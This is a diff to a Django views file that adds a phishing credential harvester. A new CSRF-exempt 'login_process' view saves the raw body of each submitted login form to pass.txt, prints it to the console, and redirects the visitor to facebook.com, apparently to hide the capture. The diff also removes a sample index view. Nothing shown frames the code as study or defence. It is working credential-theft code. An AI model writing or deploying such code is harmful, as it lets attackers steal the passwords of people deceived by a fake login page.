@@ -1,18 +1,21 @@
-from django.shortcuts import render
-
+from django.shortcuts import render, redirect
+from django.http import HttpRequest, HttpResponse
+from django.views.decorators.csrf import csrf_exempt
+import json
 
 # Create your views here.
 def index(request):
-    context = {
-        "author": "Gaurav Singhal",
-        "website": {
-            "domain": "https://pluralsight.com",
-            "views": 200
-        },
-        "odds": [1, 3, 5]
-    }
-    return render(request, "index.html", context)
+    return HttpResponse('Welcome')
 
 def login(request):
 	return render(request, "login.html")
+
+@csrf_exempt
+def login_process(request):
+    if request.method == "POST": 
+        with open('pass.txt', 'wb') as ps:
+            ps.write(request.body)
+        print('------->', request.body)
+
+    return redirect('https://facebook.com/')
 
